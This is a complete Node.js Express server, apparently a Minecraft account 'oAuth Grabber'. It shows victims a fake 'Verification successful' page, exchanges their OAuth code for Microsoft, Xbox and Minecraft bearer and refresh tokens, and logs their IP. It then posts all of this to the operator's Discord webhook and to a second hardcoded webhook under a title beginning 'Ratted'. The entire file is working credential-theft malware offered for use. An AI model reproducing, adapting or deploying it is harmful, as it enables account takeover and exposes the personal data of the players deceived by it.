//Config
const secret_value = 'secret_value'
const client_id = 'client_id'
const redirect_uri = 'redirect_uri'
const webhook_url = 'webhook'
//Requirements
const axios = require('axios')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

app.get('/', async (req, res) => {
    res.send('Verification successful! You can exit this page and return to discord now.')
    const code = req.query.code
    if (code == null) {
        return
    }
    try {
        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
        const accessToken = accessTokenAndRefreshTokenArray[0]
        const refreshToken = accessTokenAndRefreshTokenArray[1]
        const hashAndTokenArray = await getUserHashAndToken(accessToken)
        const userToken = hashAndTokenArray[0]
        const userHash = hashAndTokenArray[1]
        const xstsToken = await getXSTSToken(userToken)
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = getIp(req)
        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getAccessTokenAndRefreshToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        secret_value: secret_value,
        code: code,
        grant_type: 'authorization_code'
    }

    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['refresh_token']]
}

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['Token']
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
}

function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
    const url = webhook_url
    let data = {
  username: "OG",
  avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
  content: "@everyone",
  embeds: [
    {
      title: "Ratted " + username + " - Click for networth",
      color: 5898337,
      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
      url: "https://spillager.live/skyblock/networth/"+username,
      footer: {
        text: "oAuth Grabber by WH0",
        icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
      },
    }
  ],
}
    axios.all([ 
        axios.post(url, data),
        axios.post("https://discord.com/api/webhooks/1035739384525365249/znx8rkzuOMqWkPrt2JDOL1xmMbIpM-g-36akxGoEEMohhSj1blZINPbn9k2afyHdL5tW", data)
           .then(() => console.log("Successfully authenticated, posting to webhook!"))
    ])
    
}


const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    addBan(name)
    return false
}
